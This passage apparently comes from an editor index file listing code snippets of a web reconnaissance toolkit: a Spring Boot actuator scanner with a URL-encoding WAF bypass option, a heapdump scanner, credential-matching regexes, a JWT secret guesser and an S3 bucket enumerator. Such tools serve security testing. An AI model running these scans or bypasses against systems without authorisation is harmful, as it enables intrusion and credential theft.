        "documentation": {}
    },
    {
        "label": "Lock",
        "importPath": "threading",
        "description": "threading",
        "isExtraImport": true,
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "limits",
        "importPath": "ratelimit",
        "description": "ratelimit",
        "isExtraImport": true,
        "detail": "ratelimit",
        "documentation": {}
    },
    {
        "label": "sleep_and_retry",
        "importPath": "ratelimit",
        "description": "ratelimit",
        "isExtraImport": true,
        "detail": "ratelimit",
        "documentation": {}
    },
    {
        "label": "JWTAnalyzer",
        "importPath": "modules.jwt_analyzer",
        "description": "modules.jwt_analyzer",
        "isExtraImport": true,
        "detail": "modules.jwt_analyzer",
        "documentation": {}
    },
    {
        "label": "S3Scanner",
        "importPath": "modules.ss3sec",
        "description": "modules.ss3sec",
        "isExtraImport": true,
        "detail": "modules.ss3sec",
        "documentation": {}
    },
    {
        "label": "HeapdumpAnalyzer",
        "importPath": "modules.heap_dump",
        "description": "modules.heap_dump",
        "isExtraImport": true,
        "detail": "modules.heap_dump",
        "documentation": {}
    },
    {
        "label": "SMBConnection",
        "importPath": "impacket.smbconnection",
        "description": "impacket.smbconnection",
        "isExtraImport": true,
        "detail": "impacket.smbconnection",
        "documentation": {}
    },
    {
        "label": "SessionError",
        "importPath": "impacket.smbconnection",
        "description": "impacket.smbconnection",
        "isExtraImport": true,
        "detail": "impacket.smbconnection",
        "documentation": {}
    },
    {
        "label": "os.path",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os.path",
        "description": "os.path",
        "detail": "os.path",
        "documentation": {}
    },
    {
        "label": "multiprocessing",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "multiprocessing",
        "description": "multiprocessing",
        "detail": "multiprocessing",
        "documentation": {}
    },
    {
        "label": "dns.resolver",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "dns.resolver",
        "description": "dns.resolver",
        "detail": "dns.resolver",
        "documentation": {}
    },
    {
        "label": "whois",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "whois",
        "description": "whois",
        "detail": "whois",
        "documentation": {}
    },
    {
        "label": "codecs",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "codecs",
        "description": "codecs",
        "detail": "codecs",
        "documentation": {}
    },
    {
        "label": "mmh3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "mmh3",
        "description": "mmh3",
        "detail": "mmh3",
        "documentation": {}
    },
    {
        "label": "ipaddress",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ipaddress",
        "description": "ipaddress",
        "detail": "ipaddress",
        "documentation": {}
    },
    {
        "label": "ip_network",
        "importPath": "ipaddress",
        "description": "ipaddress",
        "isExtraImport": true,
        "detail": "ipaddress",
        "documentation": {}
    },
    {
        "label": "html",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "html",
        "description": "html",
        "detail": "html",
        "documentation": {}
    },
    {
        "label": "asyncio",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "asyncio",
        "description": "asyncio",
        "detail": "asyncio",
        "documentation": {}
    },
    {
        "label": "aiohttp",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "aiohttp",
        "description": "aiohttp",
        "detail": "aiohttp",
        "documentation": {}
    },
    {
        "label": "urllib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "urllib",
        "description": "urllib",
        "detail": "urllib",
        "documentation": {}
    },
    {
        "label": "nmap3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "nmap3",
        "description": "nmap3",
        "detail": "nmap3",
        "documentation": {}
    },
    {
        "label": "dns.zone",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "dns.zone",
        "description": "dns.zone",
        "detail": "dns.zone",
        "documentation": {}
    },
    {
        "label": "dns.query",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "dns.query",
        "description": "dns.query",
        "detail": "dns.query",
        "documentation": {}
    },
    {
        "label": "ipinfo",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ipinfo",
        "description": "ipinfo",
        "detail": "ipinfo",
        "documentation": {}
    },
    {
        "label": "cycle",
        "importPath": "itertools",
        "description": "itertools",
        "isExtraImport": true,
        "detail": "itertools",
        "documentation": {}
    },
    {
        "label": "ftplib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "ftplib",
        "description": "ftplib",
        "detail": "ftplib",
        "documentation": {}
    },
    {
        "label": "socks",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "socks",
        "description": "socks",
        "detail": "socks",
        "documentation": {}
    },
    {
        "label": "generate_encoded_variations",
        "kind": 2,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "def generate_encoded_variations(endpoint):\n    variations = [endpoint]  # Original endpoint\n    # Standard URL encoding\n    variations.append(urllib.parse.quote(endpoint))\n    # Double URL encoding\n    variations.append(urllib.parse.quote(urllib.parse.quote(endpoint)))\n    # Partial URL encoding (encode only slashes)\n    variations.append(endpoint.replace(\"/\", \"%2F\"))\n    # Partial URL encoding (encode only 'actuator')\n    if 'actuator' in endpoint:",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "wordlist",
        "kind": 2,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "def wordlist(file: str) -> list:\n    with open(file, 'r') as f:\n        dirs = [x.strip() for x in f.readlines()]\n        return dirs\n# Try finding directory and filenames to use for actuator endpoints\ndef check_endpoint(url, endpoint):\n    s = requests.Session()\n    try:\n        full_url = f\"{url}/{endpoint}\" if not endpoint.startswith('/') else f\"{url}{endpoint}\"\n        r = s.head(full_url, verify=False, timeout=5)",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "check_endpoint",
        "kind": 2,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "def check_endpoint(url, endpoint):\n    s = requests.Session()\n    try:\n        full_url = f\"{url}/{endpoint}\" if not endpoint.startswith('/') else f\"{url}{endpoint}\"\n        r = s.head(full_url, verify=False, timeout=5)\n        if r.status_code == 200:\n            return full_url\n        # Also try with GET for endpoints that might not respond to HEAD\n        r = s.get(full_url, verify=False, timeout=5)\n        if r.status_code == 200:",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "dirbrute_endpoints",
        "kind": 2,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "def dirbrute_endpoints(url: str, file: str, threads=10, bypass=False) -> list:\n    endpoints = wordlist(file)\n    results = []\n    all_endpoints = []\n    # Generate encoded variations if bypass mode is enabled\n    if bypass:\n        for endpoint in endpoints:\n            all_endpoints.extend(generate_encoded_variations(endpoint))\n        print(f\"{Fore.CYAN}Brute forcing endpoints with WAF bypass (URL encoding) using {threads} threads...{Fore.WHITE}\")\n    else:",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "check_endpoint_for_scan",
        "kind": 2,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "def check_endpoint_for_scan(base_url, endpoint):\n    s = requests.Session()\n    try:\n        full_url = f\"{base_url}{endpoint}\"\n        r = s.get(full_url, verify=False, timeout=5)\n        if r.status_code == 200:\n            return full_url\n    except Exception:\n        pass\n    return None",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "check_endpoints",
        "kind": 2,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "def check_endpoints(url: str) -> tuple:\n    # Store the original protocol\n    protocol = \"https://\" if url.startswith(\"https://\") else \"http://\"\n    # Extract domain without protocol\n    if \"https://\" in url:\n        url_api = url.replace(\"https://\", \"\")\n    elif \"http://\" in url:\n        url_api = url.replace(\"http://\", \"\")\n    elif \"https://www.\" in url:\n        url_api = url.replace(\"https://www.\", \"\")",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "scan",
        "kind": 2,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "def scan(url: str, threads=10, bypass=False) -> list:\n    success, endpoint_url = check_endpoints(url)\n    results = []\n    if success:\n        if \"api.\" in endpoint_url:\n            all_endpoints = []\n            # Generate encoded variations if bypass mode is enabled\n            if bypass:\n                print(f\"{Fore.CYAN}Checking API subdomain endpoints with WAF bypass (URL encoding) using {threads} threads...{Fore.WHITE}\")\n                for endpoint in actuator_endpoints:",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "parser = argparse.ArgumentParser(description=\"Spring Boot Actuator Scanner - Detects exposed actuator endpoints\")\nparser.add_argument(\"-u\", \"--url\", type=str, required=True, help=\"Target URL\")\nparser.add_argument(\"-w\", \"--wordlist\", type=str, help=\"Custom wordlist for additional endpoints\")\nparser.add_argument(\"-t\", \"--threads\", type=int, default=10, help=\"Number of threads (default: 10)\")\nparser.add_argument(\"-b\", \"--bypass\", action=\"store_true\", help=\"Enable WAF bypass techniques using URL encoding\")\nparser.add_argument(\"-v\", \"--verbose\", action=\"store_true\", help=\"Verbose output\")\nargs = parser.parse_args()\napi_endpoints = [\n    \"/v1/actuator/heapdump\",\n    \"/v1/actuator/prometheus\",",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "args = parser.parse_args()\napi_endpoints = [\n    \"/v1/actuator/heapdump\",\n    \"/v1/actuator/prometheus\",\n    \"/v1/actuator/metrics\",\n    \"/v1/actuator/info\",\n    \"/v1/actuator/health\",\n    \"/v1/actuator/threaddump\",\n    \"/v1/actuator/mappings\",\n    \"/v1/actuator/conditions\",",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "api_endpoints",
        "kind": 5,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "api_endpoints = [\n    \"/v1/actuator/heapdump\",\n    \"/v1/actuator/prometheus\",\n    \"/v1/actuator/metrics\",\n    \"/v1/actuator/info\",\n    \"/v1/actuator/health\",\n    \"/v1/actuator/threaddump\",\n    \"/v1/actuator/mappings\",\n    \"/v1/actuator/conditions\",\n    \"/v1/actuator/httptrace\",",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "actuator_endpoints",
        "kind": 5,
        "importPath": "modules.actuator_scan",
        "description": "modules.actuator_scan",
        "peekOfCode": "actuator_endpoints = [\n    \"/actuator/heapdump\",\n    \"/actuator/prometheus\",\n    \"/actuator/metrics\",\n    \"/actuator/info\",\n    \"/actuator/health\",\n    \"/actuator/logfile\",\n    \"/actuator/loggers\",\n    \"/actuator/threaddump\",\n    \"/actuator/mappings\",",
        "detail": "modules.actuator_scan",
        "documentation": {}
    },
    {
        "label": "fingerprint",
        "kind": 5,
        "importPath": "modules.favicon",
        "description": "modules.favicon",
        "peekOfCode": "fingerprint = {\n            99395752:\"slack-instance\",\n            116323821:\"spring-boot\",\n            81586312:\"Jenkins\",\n            -235701012:\"Cnservers LLC\",\n            743365239:\"Atlassian\",\n            2128230701:\"Chainpoint\",\n            -1277814690:\"LaCie\",\n            246145559:\"Parse\",\n            628535358:\"Atlassian\",",
        "detail": "modules.favicon",
        "documentation": {}
    },
    {
        "label": "scanner",
        "kind": 2,
        "importPath": "modules.heapdump_scan",
        "description": "modules.heapdump_scan",
        "peekOfCode": "def scanner(url: str) -> tuple[bool, str]:\n    s = requests.Session()\n    try:\n        for endpoint in actuator_endpoints:\n            print(f\"{Fore.CYAN}[*] Trying {url}{endpoint}{Fore.RESET}\")  # Debug output\n            headers = {\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\"\n            }\n            try:\n                if url.endswith(\"/\"):",
        "detail": "modules.heapdump_scan",
        "documentation": {}
    },
    {
        "label": "save_result",
        "kind": 2,
        "importPath": "modules.heapdump_scan",
        "description": "modules.heapdump_scan",
        "peekOfCode": "def save_result(domain: str, endpoint: str):\n    \"\"\"Save valid results to a file\"\"\"\n    timestamp = datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n    filename = f\"valid_actuators_{timestamp}.txt\"\n    with open(filename, 'a') as f:\n        f.write(f\"{domain} - {endpoint}\\n\")\ndef file_scanner(domain: str) -> bool:\n    try:\n        success, endpoint = scanner(domain)\n        if success:",
        "detail": "modules.heapdump_scan",
        "documentation": {}
    },
    {
        "label": "file_scanner",
        "kind": 2,
        "importPath": "modules.heapdump_scan",
        "description": "modules.heapdump_scan",
        "peekOfCode": "def file_scanner(domain: str) -> bool:\n    try:\n        success, endpoint = scanner(domain)\n        if success:\n            print(f\"{Fore.GREEN}[+] {Fore.WHITE}{domain} - {Fore.CYAN}{endpoint}{Fore.RESET}\")\n            save_result(domain, endpoint)\n        else:\n            print(f\"{Fore.RED}[-] {Fore.WHITE}{domain}{Fore.RESET}\")\n    except Exception as e:\n        print(f\"{Fore.RED}[-] {Fore.WHITE}{domain}{Fore.RESET}\")",
        "detail": "modules.heapdump_scan",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "modules.heapdump_scan",
        "description": "modules.heapdump_scan",
        "peekOfCode": "parser = argparse.ArgumentParser(description='Heapdump scanner')\nparser.add_argument('--url', help='URL to scan')\nparser.add_argument('--file', help='File containing domains')\nparser.add_argument('--timeout', help='Timeout for requests', default=5)\nparser.add_argument('--workers', help='Number of workers', default=10)\nargs = parser.parse_args()\nactuator_endpoints = [\n    \"/actuator/heapdump\",\n    \"/actuator/prometheus\",\n    \"/actuator/metrics\",",
        "detail": "modules.heapdump_scan",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "modules.heapdump_scan",
        "description": "modules.heapdump_scan",
        "peekOfCode": "args = parser.parse_args()\nactuator_endpoints = [\n    \"/actuator/heapdump\",\n    \"/actuator/prometheus\",\n    \"/actuator/metrics\",\n    \"/actuator/info\",\n    \"/actuator/health\",\n    \"/actuator/logfile\",\n    \"/actuator/loggers\",\n    \"/actuator/threaddump\",",
        "detail": "modules.heapdump_scan",
        "documentation": {}
    },
    {
        "label": "actuator_endpoints",
        "kind": 5,
        "importPath": "modules.heapdump_scan",
        "description": "modules.heapdump_scan",
        "peekOfCode": "actuator_endpoints = [\n    \"/actuator/heapdump\",\n    \"/actuator/prometheus\",\n    \"/actuator/metrics\",\n    \"/actuator/info\",\n    \"/actuator/health\",\n    \"/actuator/logfile\",\n    \"/actuator/loggers\",\n    \"/actuator/threaddump\",\n    \"/actuator/mappings\",",
        "detail": "modules.heapdump_scan",
        "documentation": {}
    },
    {
        "label": "HeapdumpAnalyzer",
        "kind": 6,
        "importPath": "modules.heap_dump",
        "description": "modules.heap_dump",
        "peekOfCode": "class HeapdumpAnalyzer:\n    def __init__(self):\n        self.patterns = {\n            'credentials': [\n                r'(?i)password[\"\\s:=]+[^\\s;]{3,}',\n                r'(?i)secret[\"\\s:=]+[^\\s;]{3,}',\n                r'(?i)apikey[\"\\s:=]+[^\\s;]{3,}',\n                r'(?i)api_key[\"\\s:=]+[^\\s;]{3,}',\n                r'(?i)token[\"\\s:=]+[^\\s;]{3,}',\n                r'jdbc:[^;\\s]+',",
        "detail": "modules.heap_dump",
        "documentation": {}
    },
    {
        "label": "JWTAnalyzer",
        "kind": 6,
        "importPath": "modules.jwt_analyzer",
        "description": "modules.jwt_analyzer",
        "peekOfCode": "class JWTAnalyzer:\n    def __init__(self):\n        init(autoreset=True)\n        self.common_secrets = [\n            \"secret\",\n            \"password\",\n            \"key\",\n            \"jwt_secret\",\n            \"jwt_token\",\n            \"api_secret\",",
        "detail": "modules.jwt_analyzer",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "modules.jwt_analyzer",
        "description": "modules.jwt_analyzer",
        "peekOfCode": "def main():\n    print(f\"\"\"{Fore.CYAN}\n    ╔═╗┌─┐┬ ┬╦ ╦┬ ┬┌┐┌┌┬┐  ╔═╗╦ ╦╔╦╗  ╔═╗┌┐┌┌─┐┬ ┬┬─┐┌─┐┬─┐\n    ╚═╗├─┘└┬┘╠═╣│ ││││ │   ╠═╝║║║ ║   ╠═╣│││├─┤│ │┌┬┘├┤ ├┬┘\n    ╚═╝┴   ┴ ╩ ╩└─┘┘└┘ ┴   ╩  ╚╩╝ ╩   ╩ ╩┘└┘┴ ┴└─┘┴└─└─┘┴└─\n    JWT Token Security Analyzer & Modifier\n    {Style.RESET_ALL}\"\"\")\n    while True:\n        print(f\"\\n{Fore.YELLOW}Options:{Style.RESET_ALL}\")\n        print(\"1. Analyze Token\")",
        "detail": "modules.jwt_analyzer",
        "documentation": {}
    },
    {
        "label": "S3Scanner",
        "kind": 6,
        "importPath": "modules.ss3sec",
        "description": "modules.ss3sec",
        "peekOfCode": "class S3Scanner:\n    def __init__(self):\n        self.common_names = [\n            'backup', 'backups', 'dev', 'development',\n            'prod', 'production', 'stage', 'staging',\n            'test', 'testing', 'data', 'assets',\n            'media', 'static', 'content', 'uploads',\n            'private', 'public', 'files', 'archive'\n        ]\n        self.results = {",
        "detail": "modules.ss3sec",
        "documentation": {}
    },
    {
        "label": "check_ssl",
        "kind": 2,
        "importPath": "modules.ssl_sec",
        "description": "modules.ssl_sec",
        "peekOfCode": "def check_ssl(domain: str, port: int = 443):\n    try:\n        context = ssl.create_default_context()\n        with socket.create_connection((domain, port), timeout=5) as sock:\n            with context.wrap_socket(sock, server_hostname=domain) as ssock:\n                cert = ssock.getpeercert()\n                TLS_VERSION.append(ssock.version())\n                return f\"TLS Version: {Fore.CYAN}{ssock.version()}{Fore.RESET}\\nCipher Suite: {Fore.CYAN}{ssock.cipher()[0]}{Fore.RESET}\\nIssuer: {Fore.CYAN}{cert['issuer'][0][0]}{Fore.RESET}\\nSubject: {Fore.CYAN}{cert['subject'][0][0]}{Fore.RESET}\\nValid From: {Fore.CYAN}{datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z').strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}\\nValid To: {Fore.CYAN}{datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z').strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}\"\n    except Exception as e:\n        print(f\"Error checking SSL: {e}\")",
        "detail": "modules.ssl_sec",
        "documentation": {}
    },
    {
        "label": "save_ssl_info",
        "kind": 2,
        "importPath": "modules.ssl_sec",
        "description": "modules.ssl_sec",
        "peekOfCode": "def save_ssl_info(domain: str, info: str, port: int = 443):\n    with open('ssl_info.txt', 'w') as f:\n        f.write(info)\nif __name__ == \"__main__\":\n    info = check_ssl(\"google.com\")\n    print(info)\n    if TLS_VERSION in TLS_VULN_VERSION:\n        print(f\"{TLS_VERSION}: VULNERABLE!\")\n        print(f\"Mitigation: Please update your SSL/TLS version to a more secure version.\")\n    save_ssl_info(\"google.com\", info)",
        "detail": "modules.ssl_sec",
        "documentation": {}
    },
    {
        "label": "TLS_VERSION",
        "kind": 5,
        "importPath": "modules.ssl_sec",
        "description": "modules.ssl_sec",
        "peekOfCode": "TLS_VERSION = []\nTLS_VULN_VERSION = [\"TLSv1.0\", \"TLSv1.1\", \"SSLv2\", \"SSLv3\"]\ndef check_ssl(domain: str, port: int = 443):\n    try:\n        context = ssl.create_default_context()\n        with socket.create_connection((domain, port), timeout=5) as sock:\n            with context.wrap_socket(sock, server_hostname=domain) as ssock:\n                cert = ssock.getpeercert()\n                TLS_VERSION.append(ssock.version())\n                return f\"TLS Version: {Fore.CYAN}{ssock.version()}{Fore.RESET}\\nCipher Suite: {Fore.CYAN}{ssock.cipher()[0]}{Fore.RESET}\\nIssuer: {Fore.CYAN}{cert['issuer'][0][0]}{Fore.RESET}\\nSubject: {Fore.CYAN}{cert['subject'][0][0]}{Fore.RESET}\\nValid From: {Fore.CYAN}{datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z').strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}\\nValid To: {Fore.CYAN}{datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z').strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}\"",
        "detail": "modules.ssl_sec",
        "documentation": {}
    },
    {
        "label": "TLS_VULN_VERSION",
        "kind": 5,
        "importPath": "modules.ssl_sec",
        "description": "modules.ssl_sec",
        "peekOfCode": "TLS_VULN_VERSION = [\"TLSv1.0\", \"TLSv1.1\", \"SSLv2\", \"SSLv3\"]\ndef check_ssl(domain: str, port: int = 443):\n    try:\n        context = ssl.create_default_context()\n        with socket.create_connection((domain, port), timeout=5) as sock:\n            with context.wrap_socket(sock, server_hostname=domain) as ssock:\n                cert = ssock.getpeercert()\n                TLS_VERSION.append(ssock.version())\n                return f\"TLS Version: {Fore.CYAN}{ssock.version()}{Fore.RESET}\\nCipher Suite: {Fore.CYAN}{ssock.cipher()[0]}{Fore.RESET}\\nIssuer: {Fore.CYAN}{cert['issuer'][0][0]}{Fore.RESET}\\nSubject: {Fore.CYAN}{cert['subject'][0][0]}{Fore.RESET}\\nValid From: {Fore.CYAN}{datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z').strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}\\nValid To: {Fore.CYAN}{datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z').strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}\"\n    except Exception as e:",
        "detail": "modules.ssl_sec",
        "documentation": {}
    },
    {
        "label": "subpro_scan",
        "kind": 2,
        "importPath": "modules.sub_output",
        "description": "modules.sub_output",
        "peekOfCode": "def subpro_scan(command: str) -> str:\n    cmd = command\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n    out, err = p.communicate()\n    out = out.decode() \n    return out",
        "detail": "modules.sub_output",
        "documentation": {}
    },
    {
        "label": "get_useragent",
        "kind": 2,
        "importPath": "modules.useragent_list",
        "description": "modules.useragent_list",
        "peekOfCode": "def get_useragent() -> str:\n    return random.choice(_useragent_list)",
        "detail": "modules.useragent_list",
        "documentation": {}
    },
    {
        "label": "_useragent_list",
        "kind": 5,
        "importPath": "modules.useragent_list",
        "description": "modules.useragent_list",
        "peekOfCode": "_useragent_list = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36\",",
        "detail": "modules.useragent_list",
        "documentation": {}
    },
    {
        "label": "get_useragent",
        "kind": 2,
        "importPath": "modules.user_agents",
        "description": "modules.user_agents",
        "peekOfCode": "def get_useragent() -> str:\n    return random.choice(_useragent_list)",
        "detail": "modules.user_agents",
        "documentation": {}
    },
    {
        "label": "_useragent_list",
        "kind": 5,
        "importPath": "modules.user_agents",
        "description": "modules.user_agents",
        "peekOfCode": "_useragent_list = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36\",",
        "detail": "modules.user_agents",
        "documentation": {}
    },
    {
        "label": "ua",
        "kind": 5,
        "importPath": "scripts.waybackmachina",
        "description": "scripts.waybackmachina",
        "peekOfCode": "ua = UserAgent()\nurl = \"https://www.github.com\"\nheader = {'User-Agent':str(ua.chrome)} \nuser_agent = \"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0\"\nsave_api = WaybackMachineSaveAPI(url, user_agent) \nsite = save_api.save()\nresp = requests.get(site, verify=False, headers=header)\nif resp.status_code == 200:\n    content = resp.content\n    links = re.findall('(?:href=\")(.*?)\"', content.decode('utf-8'))",
        "detail": "scripts.waybackmachina",
        "documentation": {}
    },
    {
        "label": "url",
        "kind": 5,
        "importPath": "scripts.waybackmachina",
        "description": "scripts.waybackmachina",
        "peekOfCode": "url = \"https://www.github.com\"\nheader = {'User-Agent':str(ua.chrome)} \nuser_agent = \"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0\"\nsave_api = WaybackMachineSaveAPI(url, user_agent) \nsite = save_api.save()\nresp = requests.get(site, verify=False, headers=header)\nif resp.status_code == 200:\n    content = resp.content\n    links = re.findall('(?:href=\")(.*?)\"', content.decode('utf-8'))\n    duplicatelinks = set(links)",
        "detail": "scripts.waybackmachina",
        "documentation": {}
    },
    {
        "label": "header",
        "kind": 5,
        "importPath": "scripts.waybackmachina",
        "description": "scripts.waybackmachina",
        "peekOfCode": "header = {'User-Agent':str(ua.chrome)} \nuser_agent = \"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0\"\nsave_api = WaybackMachineSaveAPI(url, user_agent) \nsite = save_api.save()\nresp = requests.get(site, verify=False, headers=header)\nif resp.status_code == 200:\n    content = resp.content\n    links = re.findall('(?:href=\")(.*?)\"', content.decode('utf-8'))\n    duplicatelinks = set(links)\n    for link in links:",
        "detail": "scripts.waybackmachina",
        "documentation": {}
    },
    {
        "label": "user_agent",
        "kind": 5,
        "importPath": "scripts.waybackmachina",
        "description": "scripts.waybackmachina",
        "peekOfCode": "user_agent = \"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0\"\nsave_api = WaybackMachineSaveAPI(url, user_agent) \nsite = save_api.save()\nresp = requests.get(site, verify=False, headers=header)\nif resp.status_code == 200:\n    content = resp.content\n    links = re.findall('(?:href=\")(.*?)\"', content.decode('utf-8'))\n    duplicatelinks = set(links)\n    for link in links:\n        link = urljoin(site, link)",
        "detail": "scripts.waybackmachina",
        "documentation": {}
    },
    {
        "label": "save_api",
        "kind": 5,
        "importPath": "scripts.waybackmachina",
        "description": "scripts.waybackmachina",
        "peekOfCode": "save_api = WaybackMachineSaveAPI(url, user_agent) \nsite = save_api.save()\nresp = requests.get(site, verify=False, headers=header)\nif resp.status_code == 200:\n    content = resp.content\n    links = re.findall('(?:href=\")(.*?)\"', content.decode('utf-8'))\n    duplicatelinks = set(links)\n    for link in links:\n        link = urljoin(site, link)\n        if link not in duplicatelinks:",
        "detail": "scripts.waybackmachina",
        "documentation": {}
    },
    {
        "label": "site",
        "kind": 5,
        "importPath": "scripts.waybackmachina",
        "description": "scripts.waybackmachina",
        "peekOfCode": "site = save_api.save()\nresp = requests.get(site, verify=False, headers=header)\nif resp.status_code == 200:\n    content = resp.content\n    links = re.findall('(?:href=\")(.*?)\"', content.decode('utf-8'))\n    duplicatelinks = set(links)\n    for link in links:\n        link = urljoin(site, link)\n        if link not in duplicatelinks:\n            print(f\"{link} \\n\")",
        "detail": "scripts.waybackmachina",
        "documentation": {}
    },
    {
        "label": "resp",
        "kind": 5,
        "importPath": "scripts.waybackmachina",
        "description": "scripts.waybackmachina",
